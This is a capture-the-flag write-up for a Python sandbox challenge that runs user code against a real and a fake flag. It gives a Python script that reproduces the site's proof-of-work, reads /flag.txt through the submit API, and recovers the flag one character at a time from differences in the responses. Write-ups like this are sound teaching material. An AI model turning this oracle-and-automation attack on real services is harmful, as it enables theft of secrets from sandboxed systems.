## Schrödinger's Sandbox  

<img src="images/chall.png" width=600>

We are given a webpage with a Python sandbox that runs our code in two contexts, one with the real flag and the other with a fake flag. If the outputs don't match, the server will just return `???`.  

<img src="images/webpage.png" width=600>

If we try checking the length of `flag`, we actually get the webpage to display `41`, which means both flags have the same length.  

This is huge because it means we can perform a timing side channel by comparing every index position of the two flags and infer the correct flag character from there.  

<img src="images/length.png" width=600>

In the HTML source of the webpage, we can find that the server submits the code to `/api/submit`.  

```js
try {
    // Compute PoW
    const pow = await computePow(4);

    statusText.textContent = 'Executing in quantum superposition...';

    const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Pow-Nonce': pow
        },
        body: JSON.stringify({ code })
    });
    ...
```

However, code submissions also require a proof-of-work, so automating submissions isn't that straightforward.  

```js
 // Simple proof-of-work to slow down automated requests
async function computePow(difficulty = 4) {
    const target = '0'.repeat(difficulty);
    let nonce = 0;

    // Check if crypto.subtle is available (HTTPS or localhost)
    const useSubtle = window.crypto && window.crypto.subtle;

    while (true) {
        const test = `${Date.now()}-${nonce}-${Math.random()}`;
        let hex;

        if (useSubtle) {
            try {
                const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(test));
                hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
            } catch (e) {
                // Fallback to js-sha256 library
                hex = sha256(test);
            }
        } else {
            // Use js-sha256 library for HTTP contexts
            hex = sha256(test);
        }

        if (hex.startsWith(target)) {
            return test;
        }
        nonce++;
        if (nonce % 10000 === 0) {
            await new Promise(r => setTimeout(r, 0)); // Yield to UI
        }
    }
}
```

Luckily, we can replicate the POW generation in Python.  

```python
def compute_pow():
    target = '0' * 4
    nonce = 0
    while True:
        test_str = f"{int(time.time()*1000)}-{nonce}-{random.random()}"
        h = hashlib.sha256(test_str.encode()).hexdigest()
        if h.startswith(target):
            return test_str
        nonce += 1
        if nonce % 10000 == 0:
            time.sleep(0.001)
```

For the actual side-channel attack, we can check every successive index of the flag against a charset, which means that we should get at most `2` candidates for every index.  

My initial idea was to collect all the candidates, then generate all possible combinations of the flag, but my first attack attempt revealed that the fake flag was just filled with `q`, which makes the solve way simpler.  

Thus, I was able to come up with a revised solve script. If the server returns `False` against the index check, it means both flags share the same character at that index, so we can automatically add that character to the flag. If `2` of the leaks returns `???`, we pick the candidate that isn't `q`, but if the candidates differ, we just add `q` to the flag.   

```python
def req(code):
    pow_str = compute_pow()
    headers = {
        "Content-Type": "application/json",
        "X-Pow-Nonce": pow_str
    }

    res = requests.post(f"{url}/api/submit", headers=headers, json={ "code": code })

    return res.json()

def leak(code):
    payload = f'''flag = open("/flag.txt").read();print({code})'''.strip()

    resp = req(payload)

    return resp['stdout'].strip()

charset = string.digits + string.ascii_letters + "{}_"

length = 41
flag = '0xfun{'

for idx in range(len(flag), length):
    candidates = []
    
    for char in charset:
        print("Trying:", char, '|', flag)
        result = leak(f"flag[{idx}]!='{char}'")
        
        if result == "False":
            flag += char
            break
        elif result == "???":
            candidates.append(char)

            if len(candidates) == 2:
                if all(i == 'q' for i in candidates):
                    flag += 'q'
                else:
                    flag += [i for i in candidates if i != 'q'][0]
                break
```

Running the script will eventually recover the flag.  

Flag: `0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}`